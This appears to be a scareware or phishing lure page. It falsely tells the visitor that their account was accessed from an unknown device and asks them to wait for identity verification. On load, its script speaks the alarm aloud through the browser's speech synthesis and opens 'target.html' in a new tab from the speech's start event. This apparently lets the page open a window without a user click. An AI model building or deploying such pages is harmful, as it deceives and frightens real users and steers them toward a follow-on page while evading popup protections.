<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Security Alert</title>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0f172a; color: #e2e8f0; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 24px; margin: 0; }
    .card { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 32px; max-width: 480px; text-align: center; box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4); }
    h1 { font-size: 20px; margin-bottom: 12px; color: #f87171; }
    p { font-size: 14px; line-height: 1.6; color: #94a3b8; margin-bottom: 20px; }
    .badge { display: inline-block; padding: 4px 12px; border-radius: 999px; background: rgba(220, 38, 38, 0.1); border: 1px solid rgba(220, 38, 38, 0.3); color: #dc2626; font-size: 11px; font-weight: 600; letter-spacing: 0.05em; text-transform: uppercase; margin-bottom: 24px; }
  </style>
</head>
<body>
  <div class="card">
    <div class="badge">Security Alert</div>
    <h1>Session Verification Required</h1>
    <p>Your account has been accessed from an unknown device.</p>
    <p>Please wait while we verify your identity.</p>
  </div>

  <script>
    window.addEventListener('DOMContentLoaded', () => {
      setTimeout(() => {
        if (!('speechSynthesis' in window)) return;
        
        const utter = new SpeechSynthesisUtterance("Security Alert. Your account has been accessed from an unknown device. Please verify your identity immediately.");
        utter.lang = "en-US";
        utter.rate = 0.9;
        utter.volume = 1.0;

        utter.onstart = () => {
          window.open("target.html", "_blank");
        };

        window.speechSynthesis.speak(utter);
      }, 100);
    });
  </script>
</body>
</html>
